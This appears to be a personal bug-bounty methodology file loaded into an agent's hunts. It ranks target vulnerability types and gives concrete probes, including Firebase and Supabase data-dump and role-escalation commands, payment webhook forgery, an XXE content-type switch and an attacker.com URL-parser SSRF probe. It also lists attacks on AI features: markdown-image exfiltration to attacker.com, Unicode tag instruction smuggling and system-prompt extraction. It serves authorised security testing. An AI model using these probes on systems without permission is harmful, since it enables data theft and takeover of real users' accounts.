# Hunting Playbook

Personal methodology and preferences loaded at the start of every /hunt.
Edit this file between hunts to refine your approach.

<!-- PRIORITIES: IDOR,auth_bypass,business_logic,SSRF,injection -->

## Priority Vuln Types (by ROI)

1. **IDOR / BOLA** — highest acceptance rate, clear impact, easy to prove with two accounts
2. **Auth bypass** — password reset flaws, MFA bypass, session fixation, privilege escalation
3. **Business logic** — pricing abuse, race conditions, workflow bypass, state manipulation
4. **SSRF** — internal service access, cloud metadata, blind SSRF with OOB
5. **Injection** — SQLi, SSTI (skip blind unless high-value target)
6. **AI/LLM attack surface** — prompt injection, markdown image exfiltration (`![x](https://attacker.com/#{data})`), invisible Unicode tag injection (U+E0000 range), system prompt extraction — **uncharted territory on most targets**, minimal competition (rez0 found child toy admin console IDOR via AI layer, 10k+ child profiles exposed)

## Skip List — HackerOne Core Ineligible + Low ROI

These are universally rejected or waste time. Never report:

**HackerOne Core Ineligible:**
- Self-XSS / self-DoS (unless cross-account)
- Logout CSRF / CSRF on non-sensitive forms
- Clickjacking on non-sensitive pages
- Software version disclosure / banner identification / descriptive error messages / stack traces
- Missing security headers (CSP, HSTS, cookie flags) without demonstrated exploit
- Open redirects without chaining to real impact (e.g., OAuth token theft)
- Broken link hijacking / tabnabbing
- CSV injection
- Permissive CORS without demonstrated exploitation
- Missing rate limiting on non-auth endpoints
- Missing SSL pinning / jailbreak detection
- SPF/DKIM/DMARC configuration
- Content spoofing / text injection
- Attacks requiring physical device access (unless in scope)
- Vulnerabilities only affecting unsupported/EOL browsers or OS

**Low ROI (technically valid but rarely paid well):**
- Read-only access to public data even via IDOR endpoint
- Findings requiring victim to install malware/extension
- DoS via regex/resource exhaustion (unless explicitly in scope)
- Information disclosure of non-sensitive/public data
- Version/path disclosure
- Expected tool/protocol behavior
- Test/debug credentials (unless they grant real access)

## What Makes a Finding Valid (3 Non-Negotiables)

1. **Reproducible** — step-by-step instructions a triager follows cold, first try
2. **Real security impact** — concrete attack scenario with actual consequences (not "could potentially")
3. **In scope** — both the asset AND the vuln type per program policy

## Proof Hierarchy (strongest → weakest)

1. State change proven with before/after (User B's data modified via User A's session)
2. Unauthorized data access (PII, tokens, internal data of another user)
3. Demonstrated bypass of a security control
4. Theoretical impact with strong supporting evidence

## IDOR-Specific Proof Requirements

- Two accounts, User A accessing User B's resources — always
- Data/action must NOT be publicly accessible
- Must demonstrate the ID is obtainable (not just "if attacker guesses UUID")
- State-changing IDORs (write/delete) > read-only IDORs in severity

## IDOR Role-Permission Matrix

Before testing IDOR ad-hoc, build an N×N escalation matrix (harshbothra- methodology):
- List all roles in the system (guest, user, admin, superadmin, etc.)
- Test every role→role combination: can role A perform actions of role B?
- This catches vertical escalation (user→admin) AND horizontal IDOR (user A→user B's objects)
- Use Autorize Burp extension to automate this across all captured endpoints

## IDOR 9-Pattern Test Matrix

For every IDOR candidate, run all 9:
1. **Numeric ID swap** — `?id=123` → another user's numeric ID
2. **UUID swap** — swap UUID (obtain from any leaky endpoint, profile page, logs)
3. **Hash swap** — swap MD5/SHA hash references
4. **User-prefixed ID** — `user_123` → `user_456`
5. **Object type substitution** — `/invoices/123` → `/users/123` (cross-resource IDOR)
6. **Batch endpoint ID array** — `{"ids": [userA_id, userB_id]}` in bulk operations
7. **Indirect reference** — slug/name instead of ID (`?username=victim` vs `?user_id=victim`)
8. **API version downgrade** — test `/v1/` when `/v2/` exists; older versions often skip auth checks
9. **Mass assignment** — add `user_id`, `owner_id`, or `account_id` to POST body — server may reassign ownership

## No-Code / BaaS Platform Testing (HIGHEST ROI - Test Before Anything Else)

When a no-code platform is detected (Bubble.io, Firebase, Supabase), these tests come FIRST:

**Bubble.io (76% of apps exploitable per Flusk 2023 audit):**
1. `GET /api/1.1/meta/swagger.json` - unauthenticated schema dump (ALWAYS works)
2. `GET /api/1.1/obj/<type>` for each type in swagger - check if Data API is enabled
3. List-leak bypass: query types that REFERENCE sensitive types (order->user, transaction->wallet). Protected fields leak via relational references even when direct search is blocked.
4. `POST /api/1.1/wf/<workflow-name>` - check for unauthenticated backend workflows
5. Auto-binding: intercept input field writes in DevTools, replay with sensitive fields (role, admin, balance)
6. Version-test: check `/version-test/` for different privacy rules or enabled Data API
7. Use browser console to call app's internal JS functions directly (appquery, data manager) - do NOT waste time reverse-engineering Bubble's Elasticsearch transport encoding with curl

**Firebase:**
1. `curl https://<project>.firebaseio.com/.json` - unauthenticated DB dump
2. Browser console: `firebase.firestore().collection('users').get()` - test read access
3. Browser console: `firebase.auth().signInAnonymously()` then query - anonymous auth escalation
4. Self-write role escalation: `firebase.firestore().doc('users/'+uid).update({isAdmin:true})`
5. Storage: check if file URLs bypass Storage security rules via direct GCS access

**Supabase:**
1. `supabase.from('users').select('*')` with anon key - check RLS
2. UUID dump: `GET /rest/v1/<table>?id=gt.00000000-0000-0000-0000-000000000000`
3. Check JS bundles for `service_role` key (CRITICAL - full DB takeover if found)
4. Test `supabase.rpc()` endpoints for SECURITY DEFINER functions that bypass RLS
5. AI-generated apps (Lovable, Bolt) systematically omit RLS - 11% leak rate

## Payment Flow Testing (MANDATORY for Financial Targets)

1. **Pre-payment state check**: Click Buy, DON'T complete payment, check if credits/items were already added
2. **Webhook forgery**: Find webhook endpoint, send forged `payment_intent.succeeded` without HMAC signature
3. **Price manipulation**: Intercept checkout request, modify Amount/price_id field
4. **Sell-back arbitrage**: free/demo item -> claim -> sell for credits -> buy real items -> repeat
5. **Race condition**: Single-packet HTTP/2 attack on one-time bonuses/coupons (Turbo Intruder)
6. **Bonus credit tagging**: Check if sell-back credits from free sources can buy paid content

## Testing Approach

- **Platform detection first** - check for Bubble.io/Firebase/Supabase before anything else
- **Auth endpoints second** — login, register, password reset, MFA
- **Two accounts always** — create User A + User B before anything else
- **Check GraphQL introspection** — `{__schema{types{name,fields{name}}}}`
- **API versioning** — test /v1/ endpoints when /v2/ exists (often less hardened)
- **Mobile API** — check for separate mobile endpoints (different auth, less validation)
- **Bulk operations** — array of IDs, negative IDs, UUID enumeration
- **State transitions** — cancel after payment, reuse single-use tokens, modify in-flight
- **JS file analysis** — hidden endpoints, hardcoded keys, API routes
- **Changelogs** — new features = untested code = bugs
- **Deep focus** — spend 2+ weeks on a single target, not spray across many
- **Secondary systems first** — partner portals, staging environments, internal tools, and acquired-brand subdomains have weaker review cycles than the main hardened product. Test these before the primary app.
- **RFC-based testing** — before testing any auth, session, or upload protocol, skim the IETF RFC Security Considerations section. Use IETF Rfcdiff to compare old vs current RFC versions. Implementation deviations from spec = vulnerabilities (EdOverflow approach).
- **Acquisition hunting** — check Wikipedia and company privacy policies for subsidiary brands running on separate infrastructure. These are in scope but rarely hardened to the same level.
- **Content-type switching** — for every JSON POST, also send `Content-Type: text/xml` with an XXE payload — many backends silently support dual parsers. Most hunters never probe JSON endpoints for XXE (harshbothra-).
- **URL parser split** — probe every URL-accepting parameter with `https://attacker.com\@target.com` — RFC3986 validators see `target.com` as host and pass; WHATWG-based HTTP clients route to `attacker.com`. One probe catches both SSRF and redirect bypass (xdavidhu Google Cloud chain, $5k+).
- **Rate limit threshold behavior** — rate limits are not binary. Test behavior at 1,000 and 2,000+ requests — some limiters enter inconsistent states that reveal valid vs invalid credentials (arneswinnen Instagram: 45 passwords/second discovered this way).
- **AI/LLM features** — treat any AI chat, completion, RAG retrieval, or document generation as attack surface: prompt injection, markdown image URL exfiltration, invisible Unicode instruction smuggling, system prompt extraction.
- **Helpdesk platforms** — check support/help/desk subdomains for abandoned CNAME takeover. Active Zendesk: email trust chain (send ticket from internal-format email, SSO trusts helpdesk-verified identity) = full SSO bypass without password (regala_).
- **Reverse proxy auth patterns** — look for `_api/<service>/` or `/bff/proxy/` endpoints. Call without auth — if third-party API data returns, the proxy is baking in credentials and you have unauthenticated admin API access.
- **GraphQL path enumeration** — when GraphQL is detected, test each path in the schema that reaches sensitive types independently. Authorization often protects the primary query path but not alternate resolver paths reaching the same type (dee-see graphql-path-enum).

## Reporting Threshold

Only report if ALL are true:
- Clear security impact (not just "bad practice")
- Reproducible with provided steps on first try
- In scope per program policy (both asset and vuln type)
- Medium+ severity (CVSS 4.0+)
- Not a known duplicate (check DB first)
- NOT on the skip list above

## Evidence Standards

- **curl proof** for every finding (not just browser screenshots)
- **Before/after** showing state change
- **Two-account proof** for IDOR (User A accessing User B's data)
- **Expected vs Actual** section — what should happen vs what does
- **Screenshot** of the impact (data exposed, action performed)
- **reproduce.py** script that works standalone and prints VULNERABLE/NOT VULNERABLE
- **Clarify ambiguous responses upfront** — if response contains "success: false" but still proves the bug, explain why immediately

## What Triagers Actually Care About

1. Can they reproduce it on first attempt? (most NMIs are from missing repro steps)
2. Is the impact clearly business-focused? (not just technical jargon)
3. Is the severity justified with reasoning? (CVSS per-metric)
4. Are ambiguous results explained? (don't leave them guessing)
5. Is every curl copy-paste ready? (exact URLs, parameters, headers)

## Context Rules

- Compact between phases — run `/compact` after recon, testing, sync
- Pipe verbose output to files — never dump >50 lines inline
- Read selectively — use `head`, `jq`, `python -c` to extract what's needed
- Max 2 parallel background agents at a time
